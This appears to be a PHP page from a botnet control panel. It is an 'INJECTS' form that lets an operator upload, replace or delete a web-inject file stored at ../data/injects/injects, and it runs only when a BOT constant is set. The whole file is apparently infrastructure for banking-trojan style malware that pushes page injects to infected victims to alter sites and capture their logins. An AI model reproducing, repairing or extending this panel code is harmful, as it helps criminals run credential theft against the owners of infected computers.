<?php

	if (!BOT) exit();



	if ($_POST['delete']) {
		unlink('../data/injects/injects');
	}
	elseif (!empty($_FILES)) {
		$DATA = file_get_contents($_FILES['injfile']['tmp_name']);
		$DATA = str_replace("\r\n", "\n", $DATA);
		$DATA = str_replace("\r", "\n", $DATA);
		file_put_contents('../data/injects/injects', "\n".$DATA."\n");
	}


	clearstatcache();
	$STAT = @stat('../data/injects/injects');

	print "<form method=post enctype=multipart/form-data>
<table cellspacing=1 cellpadding=0 class=block>
	<tr>
		<td width=250px><b>INJECTS<br><br>";


	if ($STAT['mtime']) print "		file size: {$STAT['size']} bytes<br>
		uploaded: ".date("d/m/Y - H:i:s", $STAT['mtime'])."</b><br><br>
		<input type=submit class=button name='delete' value='DELETE'>";


	print "</td>
		<td><input type=file style='width:200px;' name='injfile'> <input type=submit class=button value='GO'></td>
	</tr>
</table>
</form>";

?>